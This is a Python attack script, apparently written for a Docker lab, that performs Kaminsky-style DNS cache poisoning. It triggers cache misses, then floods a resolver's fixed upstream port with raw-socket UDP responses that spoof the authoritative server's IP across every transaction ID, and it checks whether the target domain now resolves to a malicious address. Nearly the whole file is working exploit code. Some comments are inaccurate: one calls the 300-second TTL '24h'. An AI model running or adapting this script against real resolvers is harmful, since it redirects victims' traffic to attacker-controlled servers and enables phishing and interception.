#!/usr/bin/env python3
"""
Classic Kaminsky DNS Cache Poisoning Attacker.

Strategy
--------
The resolver uses a FIXED source port (UPSTREAM_PORT) when forwarding queries
to the auth server. This means the only unknown is the 16-bit transaction ID
(0x0001–0xFFFF = 65 535 possibilities).

Attack loop (per poisoning attempt):
  1. Trigger a cache miss on the resolver by sending it a DNS query for the
     target domain from a spoofed victim address.
  2. Immediately flood the resolver's fixed upstream port with crafted UDP
     packets that look like they came from the auth server's IP, trying every
     possible transaction ID (birthday attack — we don't need all 65535; with
     enough parallel threads we'll hit the right one quickly).
  3. If any spoofed packet arrives at the resolver BEFORE the real auth-server
     reply AND has the correct txid, the forged IP gets stored in cache.
  4. Repeat until poisoning is confirmed (resolver returns the malicious IP to
     the victim).

INTENTIONAL ENVIRONMENT NOTE:
  Raw sockets require CAP_NET_RAW (root / --privileged in Docker).
  The Dockerfile runs this container as root for lab purposes only.
"""

import socket
import struct
import threading
import time
import os
import random

# ── Config ────────────────────────────────────────────────────────────────────
RESOLVER_IP     = os.getenv("RESOLVER_IP",    "10.0.0.2")
RESOLVER_PORT   = int(os.getenv("RESOLVER_PORT",   53))
UPSTREAM_PORT   = int(os.getenv("UPSTREAM_PORT", 5300))  # resolver's fixed upstream port
AUTH_IP         = os.getenv("AUTH_IP",        "10.0.0.3")
VICTIM_IP       = os.getenv("VICTIM_IP",      "10.0.0.4")
TARGET_DOMAIN   = os.getenv("TARGET_DOMAIN",  "evil.example.com")
MALICIOUS_IP    = os.getenv("MALICIOUS_IP",   "6.6.6.6")

# Flood tuning
FLOOD_THREADS   = int(os.getenv("FLOOD_THREADS", 4))     # parallel sender threads
TXID_CHUNK      = int(os.getenv("TXID_CHUNK", 200))      # txids per thread per round
ROUND_DELAY     = float(os.getenv("ROUND_DELAY", 0.05))  # seconds between trigger rounds
MAX_ROUNDS      = int(os.getenv("MAX_ROUNDS", 50))


# ── DNS packet builders ────────────────────────────────────────────────────────

def build_dns_query(domain: str, txid: int) -> bytes:
    """Plain query (used to trigger resolver cache miss)."""
    header   = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    question = b""
    for label in domain.split("."):
        enc = label.encode()
        question += struct.pack("B", len(enc)) + enc
    question += b"\x00" + struct.pack(">HH", 1, 1)
    return header + question


def build_spoofed_response(txid: int, domain: str, malicious_ip: str) -> bytes:
    """
    DNS response that LOOKS like it came from the auth server.
    The actual IP spoofing (src IP = AUTH_IP) is done at the IP layer
    via raw socket.
    """
    header = struct.pack(">HHHHHH",
                         txid,
                         0x8180,   # QR=1, AA=0, RD=1, RA=1
                         1, 1, 0, 0)
    question = b""
    for label in domain.split("."):
        enc = label.encode()
        question += struct.pack("B", len(enc)) + enc
    question += b"\x00" + struct.pack(">HH", 1, 1)

    # Answer section
    answer  = struct.pack(">HHIH", 0xC00C, 1, 1, 300)   # TTL = 24h (long-lived poison)
    answer += struct.pack(">H", 4) + socket.inet_aton(malicious_ip)

    return header + question + answer


# ── Raw socket / IP helpers ────────────────────────────────────────────────────

def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_ip_header(src_ip: str, dst_ip: str, total_length: int) -> bytes:
    version_ihl = (4 << 4) | 5
    tos         = 0
    ip_id       = random.randint(0, 0xFFFF)
    flags_frag  = 0
    ttl         = 64
    protocol    = socket.IPPROTO_UDP   # 17
    src         = socket.inet_aton(src_ip)
    dst         = socket.inet_aton(dst_ip)

    # Checksum placeholder = 0, compute after
    ip_hdr = struct.pack(">BBHHHBBH4s4s",
                         version_ihl, tos, total_length,
                         ip_id, flags_frag,
                         ttl, protocol, 0,
                         src, dst)
    cs = checksum(ip_hdr)
    return struct.pack(">BBHHHBBH4s4s",
                       version_ihl, tos, total_length,
                       ip_id, flags_frag,
                       ttl, protocol, cs,
                       src, dst)


def build_udp_header(src_port: int, dst_port: int,
                     payload: bytes, src_ip: str, dst_ip: str) -> bytes:
    udp_length = 8 + len(payload)
    # Pseudo-header for checksum
    pseudo = (socket.inet_aton(src_ip)
              + socket.inet_aton(dst_ip)
              + struct.pack(">BBH", 0, socket.IPPROTO_UDP, udp_length))
    cs = checksum(pseudo + struct.pack(">HHH", src_port, dst_port, udp_length) + b"\x00\x00" + payload)
    return struct.pack(">HHHH", src_port, dst_port, udp_length, cs)


def send_spoofed_packet(raw_sock, src_ip: str, src_port: int,
                        dst_ip: str, dst_port: int, payload: bytes):
    """Send one UDP packet with a spoofed source IP via raw socket."""
    udp_hdr  = build_udp_header(src_port, dst_port, payload, src_ip, dst_ip)
    packet   = udp_hdr + payload
    total_len = 20 + len(packet)
    ip_hdr   = build_ip_header(src_ip, dst_ip, total_len)
    raw_sock.sendto(ip_hdr + packet, (dst_ip, dst_port))


# ── Flood worker ───────────────────────────────────────────────────────────────

def flood_worker(txid_range: range, stop_event: threading.Event):
    """
    Send spoofed DNS responses to the resolver's upstream port,
    cycling through a range of transaction IDs.
    src IP is spoofed as AUTH_IP so the resolver trusts the response.
    """
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[ATTACKER] ERROR: Raw socket requires root / CAP_NET_RAW. "
              "Make sure the container runs with --privileged.")
        return

    for txid in txid_range:
        if stop_event.is_set():
            break
        payload = build_spoofed_response(txid, TARGET_DOMAIN, MALICIOUS_IP)
        try:
            send_spoofed_packet(
                raw_sock,
                src_ip=AUTH_IP,         # spoofed — looks like auth server
                src_port=AUTH_PORT_FOR_SPOOF,
                dst_ip=RESOLVER_IP,
                dst_port=UPSTREAM_PORT, # resolver's fixed upstream port
                payload=payload,
            )
        except Exception as e:
            pass   # silent — flood speed matters more than individual errors

    raw_sock.close()


AUTH_PORT_FOR_SPOOF = 53   # pretend to be auth server's port 53


# ── Trigger + verify ───────────────────────────────────────────────────────────

def trigger_cache_miss():
    """Send a query to the resolver for TARGET_DOMAIN to force a cache miss."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)
    txid  = random.randint(1, 0xFFFF)
    query = build_dns_query(TARGET_DOMAIN, txid)
    try:
        sock.sendto(query, (RESOLVER_IP, RESOLVER_PORT))
    except Exception:
        pass
    finally:
        sock.close()


def check_poisoned() -> str | None:
    """
    Query the resolver for TARGET_DOMAIN and return the IP it gives back.
    Returns None on timeout.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    txid  = random.randint(1, 0xFFFF)
    query = build_dns_query(TARGET_DOMAIN, txid)
    try:
        sock.sendto(query, (RESOLVER_IP, RESOLVER_PORT))
        data, _ = sock.recvfrom(512)
        if len(data) >= 12:
            ancount = struct.unpack(">H", data[6:8])[0]
            if ancount > 0:
                # Fast-parse: find the IP in the last 4 bytes of the answer
                offset = len(data) - 4
                return socket.inet_ntoa(data[offset:offset + 4])
    except Exception:
        pass
    finally:
        sock.close()
    return None


# ── Main attack loop ───────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print(" Kaminsky DNS Cache Poisoning — Attack Script")
    print("=" * 60)
    print(f"  Target domain  : {TARGET_DOMAIN}")
    print(f"  Malicious IP   : {MALICIOUS_IP}")
    print(f"  Resolver       : {RESOLVER_IP}:{RESOLVER_PORT}")
    print(f"  Upstream port  : {UPSTREAM_PORT}  (fixed — brute-forceable)")
    print(f"  Spoofed auth   : {AUTH_IP}:53")
    print(f"  Flood threads  : {FLOOD_THREADS}")
    print(f"  Max rounds     : {MAX_ROUNDS}")
    print("=" * 60)

    for round_num in range(1, MAX_ROUNDS + 1):
        print(f"\n[ATTACKER] ── Round {round_num}/{MAX_ROUNDS} ──────────────────────")

        # Step 1: trigger a cache miss
        print(f"[ATTACKER] Triggering cache miss for {TARGET_DOMAIN}")
        trigger_cache_miss()

        # Step 2: flood all 65535 txids across threads
        # Divide the txid space into chunks for parallel sending
        all_txids  = list(range(1, 0x10000))
        chunk_size = max(1, len(all_txids) // FLOOD_THREADS)
        stop_event = threading.Event()
        threads    = []

        for i in range(FLOOD_THREADS):
            start = i * chunk_size
            end   = start + chunk_size if i < FLOOD_THREADS - 1 else len(all_txids)
            t = threading.Thread(
                target=flood_worker,
                args=(range(start + 1, end + 1), stop_event),
                daemon=True
            )
            threads.append(t)

        print(f"[ATTACKER] Flooding resolver port {UPSTREAM_PORT} with "
              f"{0xFFFF} spoofed responses across {FLOOD_THREADS} threads...")

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        # Step 3: check if cache is poisoned
        time.sleep(0.3)
        resolved_ip = check_poisoned()
        print(f"[ATTACKER] Resolver returned: {resolved_ip}")

        if resolved_ip == MALICIOUS_IP:
            print("\n" + "!" * 60)
            print(f"  *** CACHE POISONED SUCCESSFULLY ***")
            print(f"  {TARGET_DOMAIN} now resolves to {MALICIOUS_IP}")
            print(f"  Victims will be redirected to the attacker's server.")
            print("!" * 60)
            return

        time.sleep(ROUND_DELAY)

    print(f"\n[ATTACKER] Max rounds reached. Cache may not be poisoned yet.")
    print(f"[ATTACKER] Try increasing MAX_ROUNDS or FLOOD_THREADS.")


if __name__ == "__main__":
    main()
